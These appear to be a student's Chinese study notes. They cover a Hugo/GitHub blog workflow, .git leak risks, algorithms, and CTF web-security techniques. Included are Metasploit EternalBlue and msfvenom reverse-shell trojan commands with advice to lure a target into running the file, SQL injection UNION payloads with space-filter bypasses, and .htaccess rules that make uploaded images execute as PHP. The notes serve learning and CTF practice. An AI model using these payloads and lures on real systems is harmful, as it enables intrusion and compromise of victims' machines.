更新逻辑+网站详情（就不润色别的界面了哈哈哈有点懒）

网站采用hugo+git+github生成的一个自主经营的网站，记录自己的学习

Hugo（你的自动化印刷机）

  • 是什么： 一个静态网站生成器。它把你写好的 Markdown 文章（如 my-first-post.md）和你选的主题模板一瞬间“编译”成一整套完整的 HTML、CSS 文件。
  • 作用： 让你不用手写网页代码，只管写文章就行。
  • 工厂比喻： 设计部+印刷车间。把文字和图片排版好，印成一本本精美的小册子（整个网站的文件）。

2. Git

  • 是什么： 一个分布式版本控制系统。它在你本地工作，记录你对所有文件每一次的修改（“谁、在什么时候、改了什么地方”）。
  • 作用： 给项目存档，方便“时光倒流”，也是把本地文件推送到远程仓库的工具。
  • 工厂比喻： 档案室管理员。把印刷好的小册子按版本编号存档，并负责把最新版打包装箱，准备发往外地。

**3. GitHub

  • 是什么： 一个基于网页的代码托管平台。它接收你用 git push 推送上来的代码，并提供了一个公开的网址让别人能看到你的网站。
  • 作用： 作为远程存储中心，通过 GitHub Pages 等服务把你的网站文件直接发布到公网。
  • 工厂比喻： 你的海外总仓库和临街商铺。管理员把打包好的箱子（git push）送到这里，然后直接拆箱上架，向全世界顾客展示。

更新采用git命令：

hugo cd public git add . git commit -m “更新” git push

这是一个先把我的文本变成静态网站，然后保存草稿，最后上架的过程

但是这样通常是不安全的在这个过程中.git文件也进入了暂存区这会导致git泄露

一、Git 泄露是什么？

一句话：服务器上应该被隐藏的 .git 文件夹，被不小心公开了，任何人都能通过网络直接访问。

就像你把家里的 钥匙 忘在了门垫下面，谁路过都能捡起来开门。

二、.git 文件夹里到底有什么？为什么它这么重要？

.git 文件夹是 Git 的灵魂，它保存着整个项目的 完整版本历史记忆。

里面有什么 记录了什么 通俗理解
所有历史版本的完整快照 从项目创建到现在的每一次 commit，所有文件的完整内容 就像一台时光机，保存着你写文章时每一个时刻的完整草稿
所有修改记录 谁在什么时候做了什么修改，包括被删除的内容 就像 Word 文档的“修订记录”，但永远删不掉
所有分支、标签、暂存 所有分支、tag、stash 等临时保存的内容 包括那些你没正式提交、只是临时暂存的草稿

关键点：即使你把一句密码从代码里删了，并提交了一个“删除密码”的新版本，.git 仍然完整保留着“你曾经在这行写过密码”这个事实。

三、为什么 .git 泄露很危险？

因为别人拿到 .git 文件夹后，就能用工具（比如 GitHack）在本地 完整重建你的整个项目，包括：

  1. 所有历史版本的源码——就像拿到了你网站的所有源代码，可以一行行分析找漏洞
  2. 所有曾经存在过又被删除的内容——你删除的数据库密码、API 密钥、内网地址，全都会暴露
  3. 所有临时暂存的草稿——你 stash 起来忘了清理的敏感信息
  4. 项目的完整演进过程——从最初的雏形到最新的版本，每一步改动都一览无余

关键在第 2 步和第 3 步。

当你运行 hugo 后，public 文件夹里不仅有你博客的 HTML、CSS 等文件，还会包含你之前已经初始化好的 .git 文件夹（因为 public 文件夹本身也是一个 Git 仓库）。

而你执行的 git add .，这个 . 代表“当前目录下的所有内容”。它会无差别地把 public 文件夹里的所有东西——包括那个隐藏的 .git 文件夹本身——都加入 Git 的暂存区。

所以，当你 git commit 和 git push 后，这个 .git 文件夹就随着你的博客一起，被完整地上传到了 GitHub 上你的公开仓库里。

但你的 GitHub Pages 为什么没事？

这里有个关键区别：GitHub Pages 默认会保护 .git 目录，不让它直接对外公开访问。所以你的博客虽然也把 .git 推上去了，但别人没法通过 你的域名/.git/ 这种地址直接下载它。

可如果是你自己租一台云服务器，把 public 文件夹里的所有文件手动上传到服务器的网页根目录（比如 /var/www/html/），那就不一样了。这时，http://你的网站/.git/ 就真的可能被任何人直接访问到，这就是我们之前 CTF 里利用的那个漏洞场景。

标准的 Hugo + GitHub Pages 部署流程，通常会避免把 .git 一起提交到公开仓库。常见做法是直接用 hugo deploy 或配置 GitHub Actions，只把 public 里的网页文件同步到公开的 username.github.io 仓库中，而不会把 .git 文件夹也带上。

命令 你在干嘛 通俗理解
hugo 把 Markdown + 主题，编译成完整的静态网站 你在电脑上写好了文章草稿，现在按下“打印”按钮，把草稿变成一本可以拿在手里读的书
cd public 进入编译好的网站文件夹 这本印好的“书”，就放在 public 文件夹里
git add . 把整本“书”的所有页面都加入 Git 的暂存区 告诉 Git：“这本书的所有页我都要存档”
git commit -m "更新" 提交一次版本快照，备注信息叫“更新” 正式在版本库中拍一张快照，并贴上标签叫“更新”
git push 把本地 Git 仓库推送到远程 GitHub 上 把这张快照上传到云端，让你的博客能被别人看到

这套流程的整个逻辑就是： 本地写文章 → 编译成网站 → 用 Git 做版本控制 → 推送到 GitHub Pages 等平台上发布

第一步：让 Git 停止跟踪 public/ 和 resources/

第二步：重新提交这个“移除”操作

bash

git add .
git commit -m "修复：真正忽略 public 和 resources"

第三步：推送到远程

bash

git push

算法

  • 正在贬值的部分（“术”）： 手写代码的能力、默写标准解法的熟练度、应对无AI竞赛的刷题技巧。这部分正在被AI快速替代。
  • 正在升值的部分（“道”）： 面对复杂问题时的拆解能力、对算法模型的场景匹配能力、对复杂度的权衡决策能力。这部分是AI难以替代的“人类壁垒”。

第一部分：基础数据结构——你的“工具箱”

在任何复杂的策略之前，首先要识别出数据长什么样。这就像你要修理东西，先得知道手里拿的是扳手还是螺丝刀。

数据结构 它长什么样？ 核心解决什么问题？ 看到什么场景用它？
数组 / 链表 一串排着队的元素。 存储和遍历一组数据。 几乎是一切程序的基础。需要快速访问用数组，需要频繁插入删除用链表。
栈 一个桶。后进先出。 处理具有“回溯”性质的问题。 CTF/安全场景：函数调用栈跟踪、括号匹配检测、表达式求值、浏览器的后退功能。
队列 一根管道。先进先出。 处理具有“排队”性质的问题。 CTF/安全场景：广度优先搜索（BFS）的基础、任务调度、处理并发请求的缓冲池。
哈希表 一个超级查找表。 在几乎不花时间的情况下，快速查找、删除、插入数据。 通用/安全：建索引、缓存数据、检查重复元素。在Web安全中，用来快速匹配恶意负载特征库。
树 一个分层的目录。有根有叶。 表示具有层级关系的数据。 通用：文件系统、域名解析（DNS）。算法核心：二叉搜索树（快速查找）、堆（找最大值/最小值）。
图 一张地图（网络）。节点和连线。 表示实体之间的复杂关系。 CTF/安全场景：社交网络分析（找攻击者关联）、网络拓扑分析（找关键节点）、推荐系统。

第二部分：核心算法策略——你的“兵法”

这是你作为“战略师”的核心。当你面对一个具体的、复杂的问题时，你需要调用这部分知识来制定作战计划。

1. 我需要在数据中查找什么？

  • 场景：给你一个有序的列表（比如排好序的IP黑名单），快速找到某个IP在不在里面。
  • 战略：查找策略。
  • 工具包：
    • 二分查找：数据是有序的，就用它。效率极高。（必知）
    • 深度优先搜索（DFS）：一条道走到黑。适合“是否存在一条路径”、“遍历所有可能性”（如走迷宫）。（必知）
    • 广度优先搜索（BFS）：层层递进。适合找“最短路径”、“最少步骤”。（必知）

2. 我需要把一堆东西安排得明明白白？

  • 场景：CPU处理任务、物流规划、比赛日程安排。
  • 战略：排序与调度策略。
  • 工具包：
    • 各种排序（快排、归并、堆排）：你不需要会手写，但必须知道：快排是通用的，归并排序适合处理超大数据（外部排序），堆排序适合在数据流中动态找最大/最小。在CTF逆向中，识别出用了什么排序算法能帮你理解程序逻辑。
    • 拓扑排序：当事情有依赖关系时（A必须先于B完成），用它排出执行顺序。比如编译依赖、课程安排。（推荐了解）

3. 在资源有限的情况下，如何达到最好（或最省）？

  • 场景：网络流量最小化、地图导航、布线成本最低。
  • 战略：图论与优化策略。这是算法中最有价值的部分之一。
  • 工具包：
    • 最短路径（Dijkstra、Floyd）：地图导航。Dijkstra是“从一个点到其他所有点的最短路径”（无负权）。（必知） 在网络攻防中，模拟攻击路径时这就是核心模型。
    • 最小生成树（Prim、Kruskal）：如何用最低成本（比如最少的电缆）把所有点连接起来。设计网络布线、管道铺设。（推荐了解）
    • 动态规划（DP）：这是最难也是最强大的。核心思想是**“大事化小，记住结果”。适合求“最值”问题（最多、最少、最长），且问题能拆分成重叠的子问题。比如：背包问题（资源有限下装价值最高的东西）、最长公共子序列（对比文件差异，就是diff工具的原理）。（理解其思想即可，不建议死磕难题）**

4. 数据挖掘与模式发现（AI/安全的交叉领域）

  • 场景：从海量日志中发现攻击模式、对用户进行分群、做推荐系统。
  • 战略：统计与机器学习策略。
  • 工具包：
    • 分类（KNN、决策树、SVM）：把新东西归类。比如，根据邮件特征判断它是垃圾邮件还是正常邮件。（了解应用场景）
    • 聚类（K-Means）：把一堆东西自动分成几堆。比如，在流量日志中，自动把相似的攻击行为聚成一类，发现未知攻击。（了解应用场景）
    • 关联规则（Apriori）：发现“买了A的人也常买B”这种规律。（了解应用场景）
    • PageRank：给网页排名。核心思想是被越多高质量页面引用，自己质量就越高。这是搜索引擎的基石，也适用于社交网络影响力分析。（了解思想）

  3. 最后查 COLUMNS：根据库名和表名，获取该表中所有的列名，找到关键字段（如 username、password）。

MSF：

msfconsole和msfvenom是Metasploit框架中的两个核心组件，一个用于交互式攻击指挥，另一个用于生成恶意载荷。

具体区别如下：

📡 msfconsole：主控台

msfconsole是Metasploit框架最主要的命令行接口。你可以把它理解为整个渗透测试操作的中心控制平台。

  • 核心功能：在这里输入各种命令来启动攻击模块（Exploit）、管理攻击载荷（Payload）、建立监听器、以及控制已经攻陷的目标主机（通过Meterpreter会话）。
  • 工作方式：提供一个交互式环境，让你能够搜索并使用Metasploit框架内数以千计的模块（如漏洞利用、扫描器等），并对这些模块进行详细的参数配置。

🧬 msfvenom：载荷生成器

msfvenom是一个独立的命令行工具，专门用于生成和编码攻击载荷。它由旧版工具msfpayload和msfencode合并而来。

  • 核心功能：根据你的要求，“定制”生成一个恶意程序或一段代码（即Payload）。
  • 工作方式：你通过参数指定Payload的类型（如windows/meterpreter/reverse_tcp）、你的IP地址（LHOST）、监听端口（LPORT）以及输出格式（如exe、elf、python等），它会生成对应的恶意文件。

一句话总结：msfvenom负责制造“炮弹”（生成木马），而msfconsole负责发射“炮弹”并接收“战果”（配置监听器并控制目标）。

⚔️ 主动攻击与被动攻击的一般流程

在MSF中，攻击模式主要分为**主动（Active）和被动（Passive）**两种。

1. 主动攻击流程

主动攻击是指攻击机主动向目标机的开放端口发送攻击数据。这类攻击通常利用目标系统上运行的网络服务漏洞（如SMB、RPC等）。

特点：直接、快速，但容易被防火墙拦截或触发入侵检测系统（IDS）警报。

一般流程：

  1. 信息收集：使用Nmap等工具扫描目标，发现其开放端口和操作系统版本。

  2. 启动控制台：在Kali Linux中输入msfconsole启动主控台。

  3. 搜索模块：根据漏洞信息搜索对应的攻击模块，例如著名的ms17_010_eternalblue（永恒之蓝）。

    bash

    search ms17-010

  4. 使用模块：选定要使用的攻击模块。

    bash

    use exploit/windows/smb/ms17_010_eternalblue

  5. 配置参数：使用show options查看必填项，通常需要设置目标IP（RHOSTS）和本机IP（LHOST，用于反向连接时）。

    bash

    set RHOSTS 192.168.1.100
set LHOST 192.168.1.5

  6. 选择载荷：设定攻击成功后回连的载荷（Payload），通常选用反向连接的Meterpreter。

    bash

    set PAYLOAD windows/x64/meterpreter/reverse_tcp

  7. 发动攻击：输入run或exploit执行攻击。

    bash

    exploit

  8. 后渗透：攻击如果成功，会建立一个Meterpreter会话，输入sessions -i 1进入会话进行后续操作。

2. 被动攻击流程

被动攻击是指攻击机在本地搭建一个恶意的服务器（如Web、FTP服务器），诱导目标客户端（如浏览器、Office软件）主动连接过来，从而触发漏洞。

特点：需要一定的社会工程学技巧来欺骗用户，但成功率更高，且能穿透大部分边界防火墙。

一般流程：

  1. 生成木马：使用msfvenom生成一个恶意文件，例如一个包含恶意宏的Word文档或一个伪装成PDF的恶意程序。

    bash

    # 示例：生成一个HTA文件
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f hta-psh -o evil.hta

  2. 启动控制台：启动msfconsole。

  3. 配置监听：使用exploit/multi/handler模块，设置一个与生成木马时完全相同的Payload和IP/端口参数。

    bash

    use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit

  4. 发起诱导：此时MSF会开始监听等待连接。你需要将生成的木马文件发送给目标，并想方设法诱骗他在他的电脑上运行。

  5. 获得会话：一旦目标运行了木马，MSF的监听器就会捕捉到连接，并自动建立Meterpreter会话。

burp代理配置以及默认端口详情

第一部分：Burp Suite 代理配置方法

这本质上是让浏览器和服务器之间的流量，先去 Burp Suite 那里“绕个路”，这样 Burp 才能把数据包拦下来给你看、让你改。配置方法主要有三种，我们按常用程度来讲：

1. 浏览器代理（最常用，适合挖洞和做 Web 题） 这是你现阶段上手最直接的方式，一定要亲手配一遍。

操作很简单，就是两步：

  • 第一步（Burp 这边）： 打开 Burp，进 Proxy -> Options。看 Proxy Listeners 这个框。默认会有一条 127.0.0.1:8080 的记录，看它状态是不是 Running（运行中）。地址 127.0.0.1 只监听来自你本机的流量，是很安全的做法。
  • 第二步（浏览器这边）： 你需要一个浏览器插件来方便地切换代理，强烈推荐 FoxyProxy 或 SwitchyOmega。装好后，新建一个代理情景，参数照着填：
    • 代理协议： HTTP
    • 代理地址： 127.0.0.1
    • 代理端口： 8080 然后把这个情景应用上就行了。

关于 HTTPS 的关键一步（必做）： 当你访问 https:// 的网站时，浏览器会报“连接不安全”，这是正常的，因为 Burp 是“中间人”。你需要：

  1. 浏览器代理开着的情况下，访问 http://burp。
  2. 点右上角的 CA Certificate，下载 Burp 的证书。
  3. 把这个证书导入到你浏览器的“受信任的根证书颁发机构”里。 做完这步，HTTPS 流量就能正常抓取了。

2. 系统全局代理 在电脑的“网络和Internet设置”里，手动把 HTTP 和 HTTPS 代理都设为 127.0.0.1:8080。这个方法会让电脑上几乎所有支持代理的程序都走 Burp。

  • 优点： 能抓到一些非浏览器的流量，比如部分桌面应用。
  • 缺点： 容易产生大量噪音流量，而且不用 Burp 时记得关掉，不然上不了网。

3. 手机/模拟器代理（移动端挖洞必备） 你挖 EduSRC 的时候，很多学校有移动 APP 或公众号网页，抓它们的包就得用到这个。

  • 原理： 让手机 Wi-Fi 连到和电脑同一个局域网，然后把手机 Wi-Fi 的代理设为你电脑的 IP 和 Burp 的端口（比如 192.168.1.5:8080）。

1. Vim 的缓存文件命名规则

当你用 vim index.php 编辑文件时，为了防崩溃，Vim 会创建一个交换文件来实时保存你的修改。命名规则是：

但现实渗透中，遇到前两个（.swp, .swo）和 .bak 文件最常见。 因为很少有人会崩溃四次以上还留着这些文件。

解决

用代码编辑器（比如 VS Code）来恢复，思路很简单，就是只提取出文本部分，丢掉那些 Vim 的元数据。

方法一：直接拖进去（最简单有效）

直接把 .index.php.swp 文件拖进 VS Code 或 Sublime Text。

这是 Linux 自带的工具，专门从二进制文件中提取可打印字符，特别适合你现在的情况。

strings 会自动过滤掉二进制乱码，通常会抓出完整的 PHP 源码和数据库密码等关键信息。建议两种方法都试试，哪种有效用哪种。

curl 是干嘛的？

curl 是一个命令行下的 HTTP 客户端，你可以把它理解成“终端的浏览器”。它不发请求时就在那待着，你一敲命令，它就向指定 URL 发请求，然后把服务器返回的内容原样显示出来或保存下来。

它在 CTF 和渗透测试里主要有三个用途：

  2. 下载文件：尤其适合远程服务器没有图形界面时。
  3. 测试漏洞：手动构造各种奇怪的请求（改请求头、改方法、带 Cookie），看服务器什么反应。

Git

Git 是目前最流行的分布式版本控制系统，你可以把它理解成一个超强版的 “存档+时光机” 工具。

它的核心功能就是追踪和记录代码的每一次修改。具体来说，它能做到这几点：

  • 存档与备份：每次完成一个功能，执行一次 git commit（提交），Git 就会给整个项目拍一张“快照”，记录下此刻所有文件的样子。
  • 无限撤销：想回到任何一次存档的状态？一条命令就能让你的代码“时光倒流”。
  • 多分支开发：可以像树枝分叉一样，同时开发新功能和修复旧Bug，互不干扰，最后再合并起来。
  • 团队协作：能将所有人的修改合并在一起，如果有人和你改了同一个文件，它还会提示冲突，让你来决定保留谁的内容。

什么是 .git 目录？为什么泄露很危险？

每个用 Git 管理的项目，根目录下都有一个隐藏的 .git 文件夹。这个文件夹里，就存着这个项目的 “完整记忆” ，包括从创建伊始所有的快照、分支、历史记录等。

所以，Git 泄露漏洞的意思是：运维人员在上线网站时，不小心把 .git 这个文件夹也一起上传到了公开的服务器上。

后果就是，攻击者只要访问 http://你的目标网站/.git/，就能用工具把 .git 文件夹整个下载下来，从而完整还原出整个网站的源代码。这比我们之前看到的 .swp 或 .DS_Store 泄露要严重得多，因为后者只是片段，而 .git 泄露几乎是服务端的完整大本营。

一、Git泄露 在信息安全领域，.git 文件泄露是一种常见且危害较大的敏感信息泄露场景。它源于 Git 版本控制系统在项目中生成的 .git 目录被意外暴露在 Web 服务器上，攻击者可通过该目录获取项目的完整源代码、历史提交记录、配置文件等敏感信息。

1、.git 目录的作用与组成 Git 作为分布式版本控制系统，会在项目根目录生成 .git 目录，用于存储版本控制所需的所有元数据，包括：

版本历史：所有提交记录（commits）、分支（branches）、标签（tags）等。 文件快照：项目文件的不同版本数据（存储在 objects 目录）。 配置信息：仓库配置（config）、当前分支指针（HEAD）、索引文件（index）等。 核心子目录及文件：

objects/：存储文件快照（ blob 对象）、目录结构（ tree 对象）、提交记录（ commit 对象）等，是仓库数据的核心。 refs/：记录分支、标签对应的提交哈希（如 refs/heads/master 指向主分支最新提交）。 HEAD：指向当前所在分支的指针（如 ref: refs/heads/master）。 index：暂存区信息，记录待提交的文件状态。 config：仓库配置，可能包含远程仓库地址、用户名等信息。 2、.git 泄露的成因 部署失误：开发或运维人员在部署 Web 项目时，未排除 .git 目录，导致其被上传至生产服务器的 Web 根目录（如 wwwroot、public 等）。 权限配置不当：Web 服务器（如 Nginx、Apache）对 .git 目录未做访问限制，允许外部直接访问。 目录遍历：服务器存在目录遍历安全风险时，攻击者可通过构造路径（如 ../.git/HEAD）绕过限制访问 .git 内容。 3、.git 泄露的危害 源代码泄露：攻击者可还原项目完整源代码，分析业务逻辑，寻找 SQL 注入、XSS 等。 敏感信息暴露：历史提交中可能包含数据库账号密码、API 密钥、配置文件等敏感数据。 开发细节泄露：通过提交记录可了解开发习惯、项目架构，甚至获取内部开发文档。 供应链风险：若项目依赖第三方库，攻击者可能通过源码分析依赖组件的缺陷。

控制系统

DVCS 全称是 Distributed Version Control System，也就是分布式版本控制系统。

你现在把它拆开看，结合你之前的实践一下就明白了：

缩写 全称 含义 你熟悉的例子 VCS Version Control System 版本控制系统的统称（即管理代码版本的工具） Git, SVN, Mercurial (Hg) 都是 DVCS Distributed VCS 分布式版本控制系统 Git, Mercurial (Hg) CVCS Centralized VCS 集中式版本控制系统 SVN, CVS 具体解释 我们拿你之前的项目来比喻，就特别好懂：

分布式 (DVCS) 像 Git、Mercurial (Hg)

你和 GitHub 的关系：每个人电脑上都有一个完整的代码仓库克隆（包括全部历史记录）。你博客的那个目录，本身就是一个独立完整的仓库。中央服务器（GitHub）坏了照样能在本地查看完整历史，因为 .git 里有全部信息。

核心特征：不依赖中央服务器。所有人地位平等。

集中式 (CVCS) 像 SVN

只有中央服务器有完整历史和所有分支。当你 svn checkout 时，只从服务器下载一个工作副本（最新版的快照），本地没有完整历史记录。.svn/pristine/ 里存的只是原始副本的备份，为了离线对比用，但不是完整历史。

核心特征：高度依赖中央服务器。服务器坏了，历史就没了（除非有备份）。

那为什么工具叫 DVCS-Ripper (分布式版本控制系统-剽窃者) 呢？ 因为它的初衷和核心功能，就是专门针对性地去“剽窃”那些因配置不当而暴露在公网上的 .git（Git）、.hg（Mercurial） 等分布式仓库。

后来工具功能扩展，顺手也把 .svn（集中式）、.bzr 等也加进来了，但名字没改。所以你用它来处理 .svn 完全没有问题，只是它的“老本行”是干分布式仓库的。

这样，你之后看到 DVCS 这个词，可以直接把它想象成以 Git 为代表的、不依赖中央服务器的版本管理工具。

一句话理解这四个关键词

关键字 作用 通俗理解
SELECT 要查什么 “我要拿哪些东西”
FROM 从哪张表查 “从哪个抽屉里拿”
WHERE 筛选条件 “只要符合什么条件的”
UNION SELECT 追加查询结果 “把另一个查询的结果也贴到后面”

你举的这个例子拆开看

sql

SELECT id, name FROM users WHERE id = 1

这句话翻译成人话就是：

从 users 这个“用户表”里，把 id 等于 1 的那一行数据找出来，只给我看它的 id 和 name 这两列。

具体拆解：

  • SELECT id, name：你点菜，只要 id 和 name 这两道菜。
  • FROM users：你指定去 users 这张桌子的菜单上点。
  • WHERE id = 1：你只吃编号为 1 的那道。

你在 SQL 注入里是怎么用的？

你现在做联合查询，本质上是把你自己的查询结果“贴”到原来的结果后面。所以规则必须和原查询保持一致。

假设原查询是：

sql

SELECT id, name FROM users WHERE id = '用户输入的参数'

步骤一：测列数 (ORDER BY)

sql

?id=1' ORDER BY 1 --+  （正常）
?id=1' ORDER BY 2 --+  （正常）
?id=1' ORDER BY 3 --+  （报错 → 说明只有 2 列！）

这里没有 FROM 和 WHERE，因为 ORDER BY 只对当前查询排序，不需要指定表。

步骤二：找注入数据的来源 (UNION SELECT ... FROM ... WHERE ...)

你已经知道有 2 列，想查数据库里所有的表名。表名不在 users 表里，而在 MySQL 自带的“系统字典” information_schema.tables 里。

所以你需要：

sql

?id=-1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --+

这个语句和 SELECT ... FROM ... WHERE ... 的关系是：

  • UNION SELECT 1, group_concat(table_name)：你要的数据（表名列表），放在第二个回显位。
  • FROM information_schema.tables：从“系统字典的表清单”里查。
  • WHERE table_schema=database()：只查当前数据库里的表。

步骤三：最终拿 Flag (UNION SELECT flag FROM sqli.flag)

当你已经知道表叫 flag，字段叫 flag，就直接：

sql

?id=-1' UNION SELECT 1, flag FROM sqli.flag --+
  • UNION SELECT 1, flag：要查的 flag。
  • FROM sqli.flag：从 sqli 数据库的 flag 表里拿。
  • 没有 WHERE：因为你要看整个表的所有行，不需要筛选。

你不需要死记硬背，记住这三句口诀就行

  1. SELECT 后面写列名（或用 * 代表所有列）
  2. FROM 后面写表名（数据从哪来）
  3. WHERE 后面写条件（只要符合条件的数据，不需要筛选时可以省略）

首先：requests库是什么？ python import requests # 导入requests库

requests是用来发送HTTP请求的库

通俗说：让Python能像浏览器一样访问网页

例子：

r = requests.get(‘http://www.baidu.com’)

这行代码的意思：用浏览器打开百度，把整个网页内容存到r里

print(r.text) # 打印网页的HTML源代码 类比理解：

requests = 一个自动化的浏览器

requests.get(url) = 在浏览器地址栏输入网址然后回车

r.text = 网页的源代码（右键→查看网页源代码看到的东西）

过滤空格，就是网站开发者为了防止 SQL 注入，把用户输入里的空格、换行、Tab 等空白字符都过滤掉了。

你回想一下你之前手写的那条联合查询语句：

sql

?id=-1' union select 1,flag from flag--+

这里的每一个空格都是必须的，union 和 select 之间需要空格，from 和 flag 之间也需要空格。

如果开发者把空格过滤了，你输入上面这句，到数据库里就变成了：

sql

?id=-1'unionselect1,flagfromflag--+

unionselect 不是一个合法的关键字，数据库根本看不懂，你的注入就失败了。

那怎么绕过？

有六种常见方式，我按你最可能遇到的顺序列出来：

① 用注释符 /\**/ 代替空格

sql

?id=-1'/**/union/**/select/**/1,flag/**/from/**/flag--+

/**/ 在 MySQL 里是注释，但它本身可以隔开关键字，是最万能的绕过方式。

② 用换行符 %0a 代替空格

sql

?id=-1'%0aunion%0aselect%0a1,flag%0afrom%0aflag--+

（在 Burp 里直接敲回车换行，或者在 URL 里用 %0a）

③ 用括号 () 来隔离 某些情况下，括号可以起到分隔作用，尤其是子查询和函数调用：

sql

?id=-1' union(select(1),(flag)from(flag))--+

④ 用 Tab 符 %09 代替空格

sql

?id=-1'%09union%09select%091,flag%09from%09flag--+

⑤ 科学计数法（和数字配合时） where id=1e0union...，用 1e0（1×10^0 = 1）这种科学计数法的写法，可以省掉数字和关键字之间的空格。

⑥ 反引号（在表名/列名上做文章） select flag from \flag`` 中，反引号可以直接贴在关键字上，在特定版本里能绕过空格检测。

.htaccess

1. 改变文件扩展名的处理方式

apache

AddType application/x-httpd-php .jpg .png .txt

这就是你刚才漏洞利用的核心，告诉Apache把指定的后缀名当成PHP执行。这正是文件上传绕过的经典手法。

2. 指定特定文件为PHP

apache

<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>

比 AddType 更精细，可以指定只有某个特定文件被解析为PHP，其他同后缀文件仍按原类型处理。

二、目录级访问控制

3. 禁止/允许IP访问

apache

# 禁止特定IP
Deny from 192.168.1.100

# 只允许特定IP
Allow from 10.0.0.1
Deny from all

可以保护后台管理目录，或者攻击者用来只让自己的IP访问上传的木马。

4. 密码保护目录

apache

AuthType Basic
AuthName "Restricted Area"
AuthUserFile /path/to/.htpasswd
Require valid-user

给某个目录加上密码弹窗。

三、URL重写与301重定向

5. 301/302重定向

apache

# 整个域名重定向
Redirect 301 / https://www.新网站.com/

# 单页重定向
Redirect 302 /old.html /new.html

这在你搭建博客时可能用过，比如强制HTTPS跳转。

6. URL重写

apache

RewriteEngine On
RewriteRule ^article/([0-9]+)\.html$ article.php?id=$1 [L]

这是伪静态技术，把 article.php?id=123 变成 article/123.html 这样的友好URL。几乎所有现代CMS（WordPress、Typecho等）都靠这个美化链接。

四、自定义错误页面

7. 自定义错误页面

apache

ErrorDocument 404 /errors/notfound.html
ErrorDocument 403 /errors/forbidden.html
ErrorDocument 500 /errors/servererror.html

这个对渗透测试很有价值：你可以故意触发404等错误，观察服务器是否返回了你自定义的页面，从而推断网站是否使用了特定的CMS或框架。

五、安全与目录保护

8. 禁用目录列表

apache

Options -Indexes

如果没有这个配置，访问一个没有 index.html 的目录会列出所有文件，那就是严重的“目录浏览”漏洞。加上这行后，直接返回403。

9. 阻止浏览特定文件类型

apache

<FilesMatch "\.(htaccess|htpasswd|ini|log|bak|swp)$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

这正是你之前学过的防御手段——用这个可以防止 .swp、.bak 等敏感文件被访问。但配置不当就可能被绕过。

六、性能与缓存

10. 开启gzip压缩

apache

AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css text/javascript application/javascript

压缩传输内容，减少带宽。

11. 设置缓存头

apache

<FilesMatch "\.(jpg|png|css|js)$">
    Header set Cache-Control "max-age=2592000, public"
</FilesMatch>

让浏览器缓存静态文件，提升访问速度。

七、CTF与渗透中的实战意义

对你现阶段挖洞和打CTF来说，应该重点关注这几个功能：

功能 攻击视角的利用
AddType 上传 .htaccess + 图片马，让 .jpg 被当PHP执行
SetHandler 同上，更精准
Options -Indexes 如果被注释掉或不存在，就有目录浏览漏洞
ErrorDocument 收集CMS指纹，判断靶场环境
Deny from 管理员配置失误可能把所有访问都拒绝，造成拒绝服务
